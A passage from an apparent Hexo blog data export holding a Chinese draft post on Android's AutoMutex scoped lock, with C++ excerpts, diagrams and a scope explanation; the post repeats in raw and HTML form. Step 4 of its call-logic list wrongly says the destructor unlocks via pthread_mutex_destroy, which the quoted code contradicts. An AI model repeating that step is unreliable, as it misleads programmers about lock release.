已初始化直接返回\n├────────────────────────────────────────────┤\n│ {                                          │ ← 进入作用域（加锁）\n│   AutoMutex _l(lock);                      │ ← 构造，加锁\n│   while (...) { ... }                      │\n│ }                                          │ ← 退出作用域（析构 -> 解锁）\n├────────────────────────────────────────────┤\n│ return gDefaultServiceManager;            │\n└────────────────────────────────────────────┘\n\n\n\n⸻\n\n🚦 为什么不整个函数都锁住？\n\t•\t如果把 AutoMutex _l(...) 放在函数顶部，即使变量已初始化，也会加锁等待，浪费性能。\n\t•\t通过作用域限制，只在 gDefaultServiceManager 为 nullptr 时才加锁，更高效。\n\n⸻\n\n✅ 总结表格\n问题\t解答\nAutoMutex 的作用域是？\t包围其定义的大括号 { ... }\n何时开始和结束？\t从 AutoMutex _l(...) 开始，到其对应的 } 结束\n为何用作用域包住？\t自动加解锁，确保线程安全，同时提高性能\n退出作用域后会发生什么？\t调用 ~AutoMutex() → 自动调用 unlock() 解锁\n⸻","source":"_drafts/android_framework_lock.md","raw":"title: android 锁\nauthor: nuoen\ntags: []\ncategories:\n  - cpp \n  - android\n  - framework\ndate: 2025-03-29 21:39:00\n\n## AutoMutex\n场景：\n```cpp\nextern Mutex gDefaultServiceManagerLock;\n\nsp<IServiceManager> defaultServiceManager()\n{\n    if (gDefaultServiceManager != nullptr) return gDefaultServiceManager;\n\n    {\n        AutoMutex _l(gDefaultServiceManagerLock);\n        while (gDefaultServiceManager == nullptr) {\n            gDefaultServiceManager = interface_cast<IServiceManager>(\n                ProcessState::self()->getContextObject(nullptr));\n            if (gDefaultServiceManager == nullptr)\n                sleep(1);\n        }\n    }\n\n    return gDefaultServiceManager;\n}\n```\n图示：\n```\n          Multiple Threads Call defaultServiceManager()\n                         ↓\n         ┌──────────────────────────────────────┐\n         │ if (gDefaultServiceManager != nullptr)│  ← 已初始化就直接返回\n         └───────────────┬──────────────────────┘\n                         │\n                         ▼\n         ┌──────────────────────────────────────┐\n         │ AutoMutex _l(gDefaultServiceManagerLock); │ ← 所有线程都要在此排队加锁\n         └───────────────┬──────────────────────┘\n                         │\n        ┌────────────────┴────────────────────────────┐\n        │                                             │\n┌───────▼───────┐                          ┌──────────▼─────────┐\n│Thread A 先获得锁│                          │Thread B、C 等待锁 │\n└───────┬───────┘                          └────────────────────┘\n        │\n        │ gDefaultServiceManager == nullptr? 是\n        ▼\n┌──────────────────────────────────────────────┐\n│Thread A 尝试创建 ServiceManager 实例          │\n│gDefaultServiceManager = interface_cast(...)  │\n└──────────────────────────────────────────────┘\n        │\n        ▼\n┌──────────────────────────────────────────────┐\n│ 初始化成功，释放锁 AutoMutex 析构自动 unlock │\n└──────────────────────────────────────────────┘\n        │\n        ▼\n┌──────────────────────────────────────────────┐\n│ Thread B/C 被唤醒，加锁后检查变量不为 null   │\n│ if (gDefaultServiceManager != nullptr) return│\n└──────────────────────────────────────────────┘\n```\n•\t这是典型的线程安全 单例懒加载（lazy initialization）；\n•\t用锁保护了“只初始化一次”的语义；\n•\t整体非常适合用于系统服务的获取场景，如 IServiceManager。\n\n实现原理\nsystem/core/include/utils/Mutex.h\n```cpp\ntypedef Mutex::Autolock AutoMutex;\n\n    class SCOPED_CAPABILITY Autolock {\n      public:\n        inline explicit Autolock(Mutex& mutex) ACQUIRE(mutex) : mLock(mutex) { mLock.lock(); }\n        inline explicit Autolock(Mutex* mutex) ACQUIRE(mutex) : mLock(*mutex) { mLock.lock(); }\n        inline ~Autolock() RELEASE() { mLock.unlock(); }\n\n      private:\n        Mutex& mLock;\n        // Cannot be copied or moved - declarations only\n        Autolock(const Autolock&);\n        Autolock& operator=(const Autolock&);\n    };\n\nclass CAPABILITY(\"mutex\") Mutex {\n  public:\n    enum {\n        PRIVATE = 0,\n        SHARED = 1\n    };\n\n    Mutex();\n    explicit Mutex(const char* name);\n    explicit Mutex(int type, const char* name = nullptr);\n    ~Mutex();\n\n    // lock or unlock the mutex\n    status_t lock() ACQUIRE();\n    void unlock() RELEASE();\n\n        pthread_mutex_t mMutex;\n\n}\n\ninline status_t Mutex::lock() {\n    return -pthread_mutex_lock(&mMutex);\n}\n\ninline Mutex::~Mutex() {\n    pthread_mutex_destroy(&mMutex);\n}\n```\n调用逻辑就是：\n1. 声明一个 AutoMutex 变量，也就是Autolock -> Mutex& mLock;\n2. Mutex& mLock 变量，mLock->pthread_mutex_t \n3. AutoMutex _l(gDefaultServiceManagerLock); 构造时，调用pthread_mutex_lock 加锁；\n4. 变量 _l,在作用域结束后，会调用其析构函数,从而调用pthread_mutex_destroy ，从而自动解锁；\n附录：\n## 作用域\n\n✅ 什么是作用域？\n\t•\t在 C++ 中，作用域是 { ... } 大括号包围的代码块。\n\t•\t变量（比如 AutoMutex _l）的生命周期限定在这个代码块内。\n\t•\t一旦出了这个作用域，变量会被自动析构（即释放资源）。\n\n⸻\n\n🎯 AutoMutex 的作用域在哪？\n```cpp\n{\n    AutoMutex _l(gDefaultServiceManagerLock);\n    ...\n}\n```\n\t•\t开始：AutoMutex _l(...) 这一行\n\t•\t结束：紧接着的 } 结束大括号\n\t•\t这个作用域内加锁，退出作用域时自动解锁\n\n⸻\n\n🔄 生命周期过程图解\n\ndefaultServiceManager()\n┌────────────────────────────────────────────┐\n│ if (gDefaultServiceManager != nullptr) ...│ ← 已初始化直接返回\n├────────────────────────────────────────────┤\n│ {                                          │ ← 进入作用域（加锁）\n│   AutoMutex _l(lock);                      │ ← 构造，加锁\n│   while (...) { ... }                      │\n│ }                                          │ ← 退出作用域（析构 -> 解锁）\n├────────────────────────────────────────────┤\n│ return gDefaultServiceManager;            │\n└────────────────────────────────────────────┘\n\n\n\n⸻\n\n🚦 为什么不整个函数都锁住？\n\t•\t如果把 AutoMutex _l(...) 放在函数顶部，即使变量已初始化，也会加锁等待，浪费性能。\n\t•\t通过作用域限制，只在 gDefaultServiceManager 为 nullptr 时才加锁，更高效。\n\n⸻\n\n✅ 总结表格\n问题\t解答\nAutoMutex 的作用域是？\t包围其定义的大括号 { ... }\n何时开始和结束？\t从 AutoMutex _l(...) 开始，到其对应的 } 结束\n为何用作用域包住？\t自动加解锁，确保线程安全，同时提高性能\n退出作用域后会发生什么？\t调用 ~AutoMutex() → 自动调用 unlock() 解锁\n⸻","slug":"android_framework_lock","published":0,"date":"2025-03-30T06:43:50.514Z","updated":"2025-03-30T09:41:25.132Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cmd44risz0008v8fycmag5kjz","content":"<p>title: android 锁<br>author: nuoen<br>tags: []<br>categories:</p>\n<ul>\n<li>cpp </li>\n<li>android</li>\n<li>framework<br>date: 2025-03-29 21:39:00</li>\n</ul>\n<h2 id=\"AutoMutex\"><a href=\"#AutoMutex\" class=\"headerlink\" title=\"AutoMutex\"></a>AutoMutex</h2><p>场景：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">extern</span> Mutex gDefaultServiceManagerLock;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">sp&lt;IServiceManager&gt; <span class=\"title\">defaultServiceManager</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (gDefaultServiceManager != <span class=\"literal\">nullptr</span>) <span class=\"keyword\">return</span> gDefaultServiceManager;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        AutoMutex _l(gDefaultServiceManagerLock);</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (gDefaultServiceManager == <span class=\"literal\">nullptr</span>) &#123;</span><br><span class=\"line\">            gDefaultServiceManager = <span class=\"built_in\">interface_cast</span>&lt;IServiceManager&gt;(</span><br><span class=\"line\">                ProcessState::<span class=\"built_in\">self</span>()-&gt;<span class=\"built_in\">getContextObject</span>(<span class=\"literal\">nullptr</span>));</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (gDefaultServiceManager == <span class=\"literal\">nullptr</span>)</span><br><span class=\"line\">                <span class=\"built_in\">sleep</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> gDefaultServiceManager;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>图示：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">          Multiple Threads Call defaultServiceManager()</span><br><span class=\"line\">                         ↓</span><br><span class=\"line\">         ┌──────────────────────────────────────┐</span><br><span class=\"line\">         │ if (gDefaultServiceManager != nullptr)│  ← 已初始化就直接返回</span><br><span class=\"line\">         └───────────────┬──────────────────────┘</span><br><span class=\"line\">                         │</span><br><span class=\"line\">                         ▼</span><br><span class=\"line\">         ┌──────────────────────────────────────┐</span><br><span class=\"line\">         │ AutoMutex _l(gDefaultServiceManagerLock); │ ← 所有线程都要在此排队加锁</span><br><span class=\"line\">         └───────────────┬──────────────────────┘</span><br><span class=\"line\">                         │</span><br><span class=\"line\">        ┌────────────────┴────────────────────────────┐</span><br><span class=\"line\">        │                                             │</span><br><span class=\"line\">┌───────▼───────┐                          ┌──────────▼─────────┐</span><br><span class=\"line\">│Thread A 先获得锁│                          │Thread B、C 等待锁 │</span><br><span class=\"line\">└───────┬───────┘                          └────────────────────┘</span><br><span class=\"line\">        │</span><br><span class=\"line\">        │ gDefaultServiceManager == nullptr? 是</span><br><span class=\"line\">        ▼</span><br><span class=\"line\">┌──────────────────────────────────────────────┐</span><br><span class=\"line\">│Thread A 尝试创建 ServiceManager 实例          │</span><br><span class=\"line\">│gDefaultServiceManager = interface_cast(...)  │</span><br><span class=\"line\">└──────────────────────────────────────────────┘</span><br><span class=\"line\">        │</span><br><span class=\"line\">        ▼</span><br><span class=\"line\">┌──────────────────────────────────────────────┐</span><br><span class=\"line\">│ 初始化成功，释放锁 AutoMutex 析构自动 unlock │</span><br><span class=\"line\">└──────────────────────────────────────────────┘</span><br><span class=\"line\">        │</span><br><span class=\"line\">        ▼</span><br><span class=\"line\">┌──────────────────────────────────────────────┐</span><br><span class=\"line\">│ Thread B/C 被唤醒，加锁后检查变量不为 null   │</span><br><span class=\"line\">│ if (gDefaultServiceManager != nullptr) return│</span><br><span class=\"line\">└──────────────────────────────────────────────┘</span><br></pre></td></tr></table></figure>\n<p>•    这是典型的线程安全 单例懒加载（lazy initialization）；<br>•    用锁保护了“只初始化一次”的语义；<br>•    整体非常适合用于系统服务的获取场景，如 IServiceManager。</p>\n<p>实现原理<br>system/core/include/utils/Mutex.h</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> Mutex::Autolock AutoMutex;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">class</span> <span class=\"title class_\">SCOPED_CAPABILITY</span> Autolock &#123;</span><br><span class=\"line\">      <span class=\"keyword\">public</span>:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"keyword\">explicit</span> <span class=\"title\">Autolock</span><span class=\"params\">(Mutex&amp; mutex)</span> <span class=\"title\">ACQUIRE</span><span class=\"params\">(mutex)</span> : mLock(mutex) &#123;</span> mLock.<span class=\"built_in\">lock</span>(); &#125;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"keyword\">explicit</span> <span class=\"title\">Autolock</span><span class=\"params\">(Mutex* mutex)</span> <span class=\"title\">ACQUIRE</span><span class=\"params\">(mutex)</span> : mLock(*mutex) &#123;</span> mLock.<span class=\"built_in\">lock</span>(); &#125;</span><br><span class=\"line\">        <span class=\"keyword\">inline</span> ~<span class=\"built_in\">Autolock</span>() <span class=\"built_in\">RELEASE</span>() &#123; mLock.<span class=\"built_in\">unlock</span>(); &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">private</span>:</span><br><span class=\"line\">        Mutex&amp; mLock;</span><br><span class=\"line\">        <span class=\"comment\">// Cannot be copied or moved - declarations only</span></span><br><span class=\"line\">        <span class=\"built_in\">Autolock</span>(<span class=\"type\">const</span> Autolock&amp;);</span><br><span class=\"line\">        Autolock&amp; <span class=\"keyword\">operator</span>=(<span class=\"type\">const</span> Autolock&amp;);</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">class</span> <span class=\"title\">CAPABILITY</span><span class=\"params\">(<span class=\"string\">&quot;mutex&quot;</span>)</span> Mutex </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">public</span>:</span><br><span class=\"line\">    <span class=\"keyword\">enum</span> &#123;</span><br><span class=\"line\">        PRIVATE = <span class=\"number\">0</span>,</span><br><span class=\"line\">        SHARED = <span class=\"number\">1</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">Mutex</span>();</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">explicit</span> <span class=\"title\">Mutex</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">char</span>* name)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">explicit</span> <span class=\"title\">Mutex</span><span class=\"params\">(<span class=\"type\">int</span> type, <span class=\"type\">const</span> <span class=\"type\">char</span>* name = <span class=\"literal\">nullptr</span>)</span></span>;</span><br><span class=\"line\">    ~<span class=\"built_in\">Mutex</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// lock or unlock the mutex</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"type\">status_t</span> <span class=\"title\">lock</span><span class=\"params\">()</span> <span class=\"title\">ACQUIRE</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">unlock</span><span class=\"params\">()</span> <span class=\"title\">RELEASE</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">pthread_mutex_t</span> mMutex;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">status_t</span> <span class=\"title\">Mutex::lock</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> -<span class=\"built_in\">pthread_mutex_lock</span>(&amp;mMutex);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">inline</span> Mutex::~<span class=\"built_in\">Mutex</span>() &#123;</span><br><span class=\"line\">    <span class=\"built_in\">pthread_mutex_destroy</span>(&amp;mMutex);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>调用逻辑就是：</p>\n<ol>\n<li>声明一个 AutoMutex 变量，也就是Autolock -&gt; Mutex&amp; mLock;</li>\n<li>Mutex&amp; mLock 变量，mLock-&gt;pthread_mutex_t </li>\n<li>AutoMutex _l(gDefaultServiceManagerLock); 构造时，调用pthread_mutex_lock 加锁；</li>\n<li>变量 _l,在作用域结束后，会调用其析构函数,从而调用pthread_mutex_destroy ，从而自动解锁；<br>附录：<h2 id=\"作用域\"><a href=\"#作用域\" class=\"headerlink\" title=\"作用域\"></a>作用域</h2></li>\n</ol>\n<p>✅ 什么是作用域？<br>    •    在 C++ 中，作用域是 { … } 大括号包围的代码块。<br>    •    变量（比如 AutoMutex _l）的生命周期限定在这个代码块内。<br>    •    一旦出了这个作用域，变量会被自动析构（即释放资源）。</p>\n<p>⸻</p>\n<p>🎯 AutoMutex 的作用域在哪？</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    AutoMutex _l(gDefaultServiceManagerLock);</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<pre><code>•    开始：AutoMutex _l(...) 这一行\n•    结束：紧接着的 &#125; 结束大括号\n•    这个作用域内加锁，退出作用域时自动解锁\n</code></pre>\n<p>⸻</p>\n<p>🔄 生命周期过程图解</p>\n<p>defaultServiceManager()<br>┌────────────────────────────────────────────┐<br>│ if (gDefaultServiceManager != nullptr) …│ ← 已初始化直接返回<br>├────────────────────────────────────────────┤<br>│ {                                          │ ← 进入作用域（加锁）<br>│   AutoMutex _l(lock);                      │ ← 构造，加锁<br>│   while (…) { … }                      │<br>│ }                                          │ ← 退出作用域（析构 -&gt; 解锁）<br>├────────────────────────────────────────────┤<br>│ return gDefaultServiceManager;            │<br>└────────────────────────────────────────────┘</p>\n<p>⸻</p>\n<p>🚦 为什么不整个函数都锁住？<br>    •    如果把 AutoMutex _l(…) 放在函数顶部，即使变量已初始化，也会加锁等待，浪费性能。<br>    •    通过作用域限制，只在 gDefaultServiceManager 为 nullptr 时才加锁，更高效。</p>\n<p>⸻</p>\n<p>✅ 总结表格<br>问题    解答<br>AutoMutex 的作用域是？    包围其定义的大括号 { … }<br>何时开始和结束？    从 AutoMutex _l(…) 开始，到其对应的 } 结束<br>为何用作用域包住？    自动加解锁，确保线程安全，同时提高性能<br>退出作用域后会发生什么？    调用 ~AutoMutex() → 自动调用 unlock() 解锁<br>⸻</p>\n","site":{"data":{}},"cover":false,"excerpt":"","more":"<p>title: android 锁<br>author: nuoen<br>tags: []<br>categories:</p>\n<ul>\n<li>cpp </li>\n<li>android</li>\n<li>framework<br>date: 2025-03-29 21:39:00</li>\n</ul>\n<h2 id=\"AutoMutex\"><a href=\"#AutoMutex\" class=\"headerlink\" title=\"AutoMutex\"></a>AutoMutex</h2><p>场景：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">extern</span> Mutex gDefaultServiceManagerLock;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">sp&lt;IServiceManager&gt; <span class=\"title\">defaultServiceManager</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (gDefaultServiceManager != <span class=\"literal\">nullptr</span>) <span class=\"keyword\">return</span> gDefaultServiceManager;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        AutoMutex _l(gDefaultServiceManagerLock);</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (gDefaultServiceManager == <span class=\"literal\">nullptr</span>) &#123;</span><br><span class=\"line\">            gDefaultServiceManager = <span class=\"built_in\">interface_cast</span>&lt;IServiceManager&gt;(</span><br><span class=\"line\">                ProcessState::<span class=\"built_in\">self</span>()-&gt;<span class=\"built_in\">getContextObject</span>(<span class=\"literal\">nullptr</span>));</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (gDefaultServiceManager == <span class=\"literal\">nullptr</span>)</span><br><span class=\"line\">                <span class=\"built_in\">sleep</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> gDefaultServiceManager;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>图示：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">          Multiple Threads Call defaultServiceManager()</span><br><span class=\"line\">                         ↓</span><br><span class=\"line\">         ┌──────────────────────────────────────┐</span><br><span class=\"line\">         │ if (gDefaultServiceManager != nullptr)│  ← 已初始化就直接返回</span><br><span class=\"line\">         └───────────────┬──────────────────────┘</span><br><span class=\"line\">                         │</span><br><span class=\"line\">                         ▼</span><br><span class=\"line\">         ┌──────────────────────────────────────┐</span><br><span class=\"line\">         │ AutoMutex _l(gDefaultServiceManagerLock); │ ← 所有线程都要在此排队加锁</span><br><span class=\"line\">         └───────────────┬──────────────────────┘</span><br><span class=\"line\">                         │</span><br><span class=\"line\">        ┌────────────────┴────────────────────────────┐</span><br><span class=\"line\">        │                                             │</span><br><span class=\"line\">┌───────▼───────┐                          ┌──────────▼─────────┐</span><br><span class=\"line\">│Thread A 先获得锁│                          │Thread B、C 等待锁 │</span><br><span class=\"line\">└───────┬───────┘                          └────────────────────┘</span><br><span class=\"line\">        │</span><br><span class=\"line\">        │ gDefaultServiceManager == nullptr? 是</span><br><span class=\"line\">        ▼</span><br><span class=\"line\">┌──────────────────────────────────────────────┐</span><br><span class=\"line\">│Thread A 尝试创建 ServiceManager 实例          │</span><br><span class=\"line\">│gDefaultServiceManager = interface_cast(...)  │</span><br><span class=\"line\">└──────────────────────────────────────────────┘</span><br><span class=\"line\">        │</span><br><span class=\"line\">        ▼</span><br><span class=\"line\">┌──────────────────────────────────────────────┐</span><br><span class=\"line\">│ 初始化成功，释放锁 AutoMutex 析构自动 unlock │</span><br><span class=\"line\">└──────────────────────────────────────────────┘</span><br><span class=\"line\">        │</span><br><span class=\"line\">        ▼</span><br><span class=\"line\">┌──────────────────────────────────────────────┐</span><br><span class=\"line\">│ Thread B/C 被唤醒，加锁后检查变量不为 null   │</span><br><span class=\"line\">│ if (gDefaultServiceManager != nullptr) return│</span><br><span class=\"line\">└──────────────────────────────────────────────┘</span><br></pre></td></tr></table></figure>\n<p>•    这是典型的线程安全 单例懒加载（lazy initialization）；<br>•    用锁保护了“只初始化一次”的语义；<br>•    整体非常适合用于系统服务的获取场景，如 IServiceManager。</p>\n<p>实现原理<br>system/core/include/utils/Mutex.h</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> Mutex::Autolock AutoMutex;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">class</span> <span class=\"title class_\">SCOPED_CAPABILITY</span> Autolock &#123;</span><br><span class=\"line\">      <span class=\"keyword\">public</span>:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"keyword\">explicit</span> <span class=\"title\">Autolock</span><span class=\"params\">(Mutex&amp; mutex)</span> <span class=\"title\">ACQUIRE</span><span class=\"params\">(mutex)</span> : mLock(mutex) &#123;</span> mLock.<span class=\"built_in\">lock</span>(); &#125;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"keyword\">explicit</span> <span class=\"title\">Autolock</span><span class=\"params\">(Mutex* mutex)</span> <span class=\"title\">ACQUIRE</span><span class=\"params\">(mutex)</span> : mLock(*mutex) &#123;</span> mLock.<span class=\"built_in\">lock</span>(); &#125;</span><br><span class=\"line\">        <span class=\"keyword\">inline</span> ~<span class=\"built_in\">Autolock</span>() <span class=\"built_in\">RELEASE</span>() &#123; mLock.<span class=\"built_in\">unlock</span>(); &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">private</span>:</span><br><span class=\"line\">        Mutex&amp; mLock;</span><br><span class=\"line\">        <span class=\"comment\">// Cannot be copied or moved - declarations only</span></span><br><span class=\"line\">        <span class=\"built_in\">Autolock</span>(<span class=\"type\">const</span> Autolock&amp;);</span><br><span class=\"line\">        Autolock&amp; <span class=\"keyword\">operator</span>=(<span class=\"type\">const</span> Autolock&amp;);</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">class</span> <span class=\"title\">CAPABILITY</span><span class=\"params\">(<span class=\"string\">&quot;mutex&quot;</span>)</span> Mutex </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">public</span>:</span><br><span class=\"line\">    <span class=\"keyword\">enum</span> &#123;</span><br><span class=\"line\">        PRIVATE = <span class=\"number\">0</span>,</span><br><span class=\"line\">        SHARED = <span class=\"number\">1</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">Mutex</span>();</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">explicit</span> <span class=\"title\">Mutex</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">char</span>* name)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span 